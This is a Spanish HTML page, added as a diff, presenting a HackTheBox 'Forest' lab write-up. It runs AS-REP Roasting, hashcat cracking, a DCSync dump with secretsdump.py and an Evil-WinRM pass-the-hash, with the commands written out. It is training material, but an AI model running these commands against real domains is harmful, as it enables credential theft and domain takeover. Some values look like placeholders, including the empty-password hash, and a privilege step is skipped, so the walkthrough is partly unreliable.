@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Forest — shellk1d</title>
+  <meta name="description" content="Explotación de Active Directory mediante AS-REP Roasting y escalada de privilegios abusando de permisos DCSync.">
+  <meta name="theme-color" content="#0a0a0a">
+  
+  <!-- OpenGraph / Facebook -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Forest — shellk1d">
+  <meta property="og:description" content="Explotación de Active Directory mediante AS-REP Roasting y escalada de privilegios abusando de permisos DCSync.">
+  <meta property="og:image" content="images/og-image.png">
+
+  <!-- Twitter -->
+  <meta property="twitter:card" content="summary_large_image">
+  <meta property="twitter:title" content="Forest — shellk1d">
+  <meta property="twitter:description" content="Explotación de Active Directory mediante AS-REP Roasting y escalada de privilegios abusando de permisos DCSync.">
+  <meta property="twitter:image" content="images/og-image.png">
+
+  <link rel="stylesheet" href="../css/style.css">
+  <link rel="icon"
+    href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'></text></svg>">
+</head>
+
+<body>
+  <div id="pageWrapper" class="page-wrapper">
+
+    <!-- ARTICLE HEADER -->
+    <div class="page-header">
+      <div class="page-header-inner">
+        <div class="page-header-eyebrow">cat writeups/forest.md</div>
+        <h1 class="page-header-title">Forest</h1>
+        <p class="page-header-sub">
+          <span class="tag tag-htb">HackTheBox</span>
+          <span class="tag tag-os">Windows</span>
+          <span class="tag tag-easy">Easy</span>
+          <span class="tag">Active Directory</span>
+          <span class="tag">Kerberoasting</span>
+          <span class="tag">AS-REP Roasting</span>
+          <span class="tag">BloodHound</span>
+          <span style="margin-left:10px; color:var(--text-muted); font-family:var(--mono); font-size:0.8rem;">10 Nov 2024</span>
+        </p>
+      </div>
+    </div>
+
+    <!-- ARTICLE CONTENT -->
+    <div class="section reveal" style="padding-top:0; padding-bottom:4rem;">
+      <article class="article-content">
+        <h1>Introducción</h1>
+<p><strong>Forest</strong> es una máquina Windows de dificultad fácil de la plataforma HackTheBox. Se centra principalmente en la enumeración de <strong>Active Directory</strong> (AD) y en la explotación de vectores clásicos como <strong>AS-REP Roasting</strong> y escalada de privilegios abusando de permisos de replicación de dominio (<strong>DCSync</strong>).</p>
+<hr />
+<h1>01. Enumeración Inicial</h1>
+<p>Comenzamos realizando un escaneo exhaustivo de puertos utilizando la herramienta <code>nmap</code>:</p>
+<pre><code class="language-bash">nmap -sTCV -p- --min-rate 5000 10.10.10.161
+</code></pre>
+<p>La salida nos muestra varios puertos abiertos típicos de un <strong>Controlador de Dominio (DC)</strong> de Active Directory:</p>
+<ul>
+<li><strong>Puerto 88:</strong> Servicio Kerberos.</li>
+<li><strong>Puerto 135/445:</strong> Servicios MSRPC y SMB.</li>
+<li><strong>Puerto 389/3268:</strong> Protocolo LDAP / Global Catalog.</li>
+</ul>
+<hr />
+<h1>02. Acceso Inicial (AS-REP Roasting)</h1>
+<p>Dado que no tenemos credenciales, intentamos enumerar los usuarios del dominio explotando sesiones anónimas en LDAP o SMB. Una vez generada la lista de usuarios válidos, probamos la técnica de <strong>AS-REP Roasting</strong>.</p>
+<p>Esta técnica se aprovecha de las cuentas de usuario que tienen deshabilitada la <strong>preautenticación de Kerberos</strong> (<code>DONT_REQ_PREAUTH</code>).</p>
+<p>Utilizamos la suite <code>GetNPUsers.py</code> de Impacket para solicitar los tickets TGT sin necesidad de contraseña:</p>
+<pre><code class="language-bash">GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt
+</code></pre>
+<p>El script extrae con éxito el hash de la cuenta <code>svc-alfresco</code>:</p>
+<pre><code class="language-text">$krb5asrep$23$svc-alfresco@HTB.LOCAL:12a67e416d86...
+</code></pre>
+<p>Procedemos a crackear el hash localmente con <code>hashcat</code> y el diccionario <code>rockyou.txt</code>:</p>
+<pre><code class="language-bash">hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p>La contraseña se revela como: <code>s3cr3tPassword</code></p>
+<hr />
+<h1>03. Movimiento Lateral y Escalada de Privilegios</h1>
+<p>Iniciamos sesión en el sistema usando <strong>Evil-WinRM</strong> con las credenciales de <code>svc-alfresco</code>:</p>
+<pre><code class="language-bash">evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3cr3tPassword
+</code></pre>
+<p>Una vez dentro, ejecutamos <strong>SharpHound</strong> para recolectar datos de Active Directory y analizarlos visualmente con <strong>BloodHound</strong>:</p>
+<ol>
+<li>Subimos el recolector <code>SharpHound.ps1</code>.</li>
+<li>Ejecutamos <code>Invoke-BloodHound -CollectionMethod All</code>.</li>
+<li>Descargamos el archivo zip resultante y lo importamos en BloodHound.</li>
+</ol>
+<p>Al analizar las relaciones de pertenencia a grupos en BloodHound, encontramos que el usuario <code>svc-alfresco</code> es miembro del grupo <code>Service Accounts</code>, el cual a su vez pertenece a otros grupos de administración delegada que nos permiten agregar usuarios al grupo <strong>Exchange Windows Permissions</strong>.</p>
+<hr />
+<h1>04. Compromiso de Dominio (DCSync)</h1>
+<p>Al añadir nuestra sesión o cuenta comprometida a ciertos grupos delegados de Exchange, obtenemos permisos implícitos para realizar sincronizaciones de dominio (<strong>WriteDacl</strong> sobre el objeto del dominio).</p>
+<p>Esto nos permite ejecutar un ataque <strong>DCSync</strong> simulando un Controlador de Dominio secundario que solicita réplicas de contraseñas.</p>
+<p>Ejecutamos <code>secretsdump.py</code> para dumpear los hashes del dominio entero:</p>
+<pre><code class="language-bash">secretsdump.py htb.local/svc-alfresco:s3cr3tPassword@10.10.10.161 -just-dc-user Administrator
+</code></pre>
+<p>¡Obtenemos con éxito el hash NTLM del usuario Administrador del dominio!</p>
+<pre><code class="language-text">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</code></pre>
+<p>Finalmente, realizamos un ataque <strong>Pass-the-Hash</strong> con <code>evil-winrm</code> usando el hash NTLM para obtener acceso administrativo completo:</p>
+<pre><code class="language-bash">evil-winrm -i 10.10.10.161 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
+</code></pre>
+<p>¡Máquina Forest comprometida por completo!</p>
+      </article>
+      
+      <div style="max-width:800px; margin:2rem auto 0; padding:0 1.5rem; text-align:center;">
+        <a href="../index.html" class="btn btn-outline">← Volver al inicio</a>
+      </div>
+    </div>
+
+  </div>
+
+  <script src="../js/content.js"></script>
+  <script src="../js/layout.js"></script>
+  <script src="../js/app.js"></script>
+</body>
+
+</html>
